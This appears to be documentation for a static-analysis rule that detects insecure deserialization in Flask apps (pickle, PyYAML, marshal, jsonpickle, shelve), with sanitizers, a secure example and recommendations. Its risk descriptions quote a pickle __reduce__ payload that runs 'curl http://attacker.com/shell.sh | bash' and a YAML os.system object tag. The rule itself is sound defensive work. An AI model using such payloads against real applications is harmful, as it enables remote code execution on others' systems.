# Content
description: |
  This rule detects insecure deserialization in Flask applications where user-
  controlled input from HTTP request parameters flows into unsafe deserialization
  functions. The following sinks are tracked:

  - pickle.loads() / pickle.load(): Python's native binary serialization. By design,
    pickle can instantiate arbitrary Python objects and execute code during deserialization
    via the __reduce__ protocol. Deserializing attacker-supplied pickle data is equivalent
    to arbitrary code execution.

  - yaml.load() / yaml.unsafe_load(): PyYAML's full loaders can construct arbitrary
    Python objects from YAML tags (!!python/object, !!python/object/apply), enabling
    code execution through crafted YAML documents.

  - marshal.loads() / marshal.load(): Python's internal bytecode serialization format.
    Not designed for untrusted data -- malformed input can cause crashes or undefined
    behavior, and code objects in marshal data execute during deserialization.

  - jsonpickle.decode(): A JSON-based format that preserves Python object types.
    Decoding attacker-supplied jsonpickle data can reconstruct arbitrary Python objects,
    including those with dangerous __reduce__ implementations.

  - shelve.open(): A persistent dictionary backed by pickle. Opening a shelve database
    file supplied by an attacker inherits all pickle deserialization risks.

  The taint analysis traces data from Flask request sources through variable assignments
  and function calls to these deserialization functions at argument position 0. Flows
  through json.loads(), yaml.safe_load(), or hmac.compare_digest() are recognized as
  sanitizers -- json.loads() constrains the data to JSON types (no code execution),
  yaml.safe_load() restricts YAML to basic types, and hmac.compare_digest() validates
  a signature before deserialization.

message: "User input flows to unsafe deserialization (pickle/yaml/marshal/jsonpickle). Use json.loads() or yaml.safe_load() for untrusted data."

security_implications:
  - title: Arbitrary Code Execution via pickle __reduce__
    description: |
      Python's pickle deserialization calls __reduce__ on each object during unpickling.
      An attacker crafts a pickle payload where __reduce__ returns (os.system, ('curl http://attacker.com/shell.sh | bash',)).
      When pickle.loads() processes this payload, it executes the OS command. There is
      no way to safely deserialize untrusted pickle data -- the format is inherently unsafe.
  - title: Remote Code Execution via YAML Object Construction
    description: |
      PyYAML's full loader supports !!python/object/apply:os.system ['id'] syntax
      in YAML documents. yaml.load() with the default Loader (or yaml.unsafe_load())
      processes this tag, calling os.system('id') during deserialization. Attackers
      can use any callable available in the Python process.
  - title: Persistent Backdoor via Shellcode Injection
    description: |
      A pickle payload can define and register new functions, modify global state,
      and install persistent mechanisms in memory. If the Flask application reuses
      Python worker processes across requests (typical in production), a deserialization
      payload can install a backdoor that persists in memory and intercepts subsequent
      requests in the same worker.
  - title: Data Integrity Attacks via Marshal Exploitation
    description: |
      marshal can deserialize Python code objects. An attacker who can supply marshal
      data can inject compiled Python bytecode that executes during deserialization.
      While marshal crashes are less predictable than pickle RCE, they can be used for
      denial of service and potentially for code execution on some Python versions.

secure_example: |
  from flask import Flask, request
  import json
  import yaml
  import hmac
  import hashlib

  app = Flask(__name__)
  SIGNING_SECRET = b'use-a-strong-random-secret-from-config'

  @app.route('/api/import', methods=['POST'])
  def import_data():
      # SAFE: json.loads() supports only JSON types -- no code execution possible
      try:
          data = json.loads(request.get_data())
      except json.JSONDecodeError:
          return {'error': 'Invalid JSON'}, 400
      return {'imported': len(data)}

  @app.route('/api/config', methods=['POST'])
  def load_config():
      config_yaml = request.form.get('config', '')
      # SAFE: yaml.safe_load() restricts to basic YAML types -- no Python object tags
      try:
          config = yaml.safe_load(config_yaml)
      except yaml.YAMLError:
          return {'error': 'Invalid YAML'}, 400
      return {'loaded': True}

  @app.route('/api/signed-data', methods=['POST'])
  def load_signed_data():
      signature = request.headers.get('X-Signature', '')
      data = request.get_data()
      # SAFE: verify HMAC signature before any deserialization
      expected = hmac.new(SIGNING_SECRET, data, hashlib.sha256).hexdigest()
      if not hmac.compare_digest(signature, expected):
          return {'error': 'Invalid signature'}, 401
      # Only deserialize after signature verification
      return json.loads(data)

recommendations:
  - Replace pickle, yaml.load(), and jsonpickle with json.loads() for data exchange -- JSON supports all common data types (strings, numbers, lists, dicts, booleans, null) without any code execution capability.
  - If YAML is required for configuration, always use yaml.safe_load() instead of yaml.load() -- safe_load() restricts parsing to basic YAML types and does not process Python object tags.
  - If you must deserialize binary data from users (e.g., for a caching or session feature), sign the data with HMAC and verify the signature before deserialization -- only deserialize data that passes signature verification.
  - Remove shelve and pickle from any code path that processes HTTP request data. These formats are for trusted data only (inter-process communication within the same trusted system).
  - Audit all uses of pickle, yaml.load(), marshal, and jsonpickle in the codebase -- any that receive data from HTTP requests must be refactored to use safe alternatives.

detection_scope: |
  Scope: global (cross-file taint tracking across the entire project).

  Sources: Flask HTTP input methods -- request.get_data(), request.get_json(),
  request.form.get(), request.args.get() -- all of which can deliver attacker-
  controlled binary or text data containing crafted serialization payloads.

  Sinks: pickle.loads(), pickle.load(), yaml.load(), yaml.unsafe_load(),
  marshal.loads(), marshal.load(), jsonpickle.decode(), shelve.open().
  The .tracks(0) parameter targets argument position 0, the serialized data
  input. For shelve.open(), position 0 is the filename -- tainted filenames
  to shelve.open() indicate attacker-controlled database file selection.

  Sanitizers: json.loads(), yaml.safe_load(), and hmac.compare_digest() are
  recognized as sanitizers. json.loads() and yaml.safe_load() replace the unsafe
  deserialization entirely. hmac.compare_digest() as a pre-deserialization
  signature check prevents tampering.

  The rule traces tainted data through variable assignments, base64 decoding,
  and cross-file function calls to deserialization sinks.

